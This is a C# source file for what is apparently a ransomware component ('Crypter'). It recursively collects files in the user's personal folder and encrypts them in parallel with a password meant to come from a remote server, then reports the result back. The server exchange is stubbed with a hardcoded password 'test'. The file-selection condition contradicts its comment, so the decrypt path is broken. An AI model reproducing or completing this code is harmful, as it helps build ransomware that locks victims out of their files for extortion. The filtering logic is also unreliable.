using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Crypter
{
    public class CrypterManager
    {
        /// <summary>
        /// Main method to process the user's local folder
        /// </summary>
        void Process()
        {
            var commands = GetDataFromServer();
            var password = commands.Item1;
            var method = commands.Item2;
            // Only the personnal folder is processed
            var files = GetFilesInFolder(Environment.GetFolderPath(Environment.SpecialFolder.Personal), method == Security.ProcessTypes.decrypt);

            var security = new Security(password);

            Task.WaitAll(files.Select(file => Task.Run(() => { security.ProcessFile(new FileInfo(file), method); })).ToArray());

            SendStatusToServer(method);
        }


        /// <summary>
        /// Get all files in the given folder
        /// </summary>
        /// <param name="path">Path of the folder to process</param>
        /// <param name="onlyCryptedFiles">Bool stating if the "*.crypted" files should be processed</param>
        /// <returns>IEnumerable of files</returns>
        IEnumerable<string> GetFilesInFolder(string path, bool onlyCryptedFiles)
        {
            var queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                foreach (var subDir in Directory.GetDirectories(path))
                {
                    queue.Enqueue(subDir);
                }

                var files = Directory.GetFiles(path);

                foreach (var file in files)
                {
                    var extension = new FileInfo(file).Extension;
                    // if only crypted files, only "*.crypted" files will be returned, else every file but "*.crypted" ones
                    if ((extension == ".crypted" && onlyCryptedFiles) || (extension != ".crypted" && !onlyCryptedFiles))
                        continue;

                    yield return file;
                }
            }
        }


        /// <summary>
        /// Get instructions from the web server via a POST request
        /// </summary>
        /// <returns>Tuple (password, method)</returns>
        Tuple<string, Security.ProcessTypes> GetDataFromServer()
        {
            // Environment.UserName + '@' + Environment.MachineName
            // decrypt password

            return new Tuple<string, Security.ProcessTypes>("test", Security.ProcessTypes.encrypt);
            // provisory
        }


        /// <summary>
        /// Send a POST request stating the result of the encryption/decrption to the web server
        /// </summary>
        /// <param name="method">Method used on the system</param>
        void SendStatusToServer(Security.ProcessTypes method)
        {

        }
    }
}
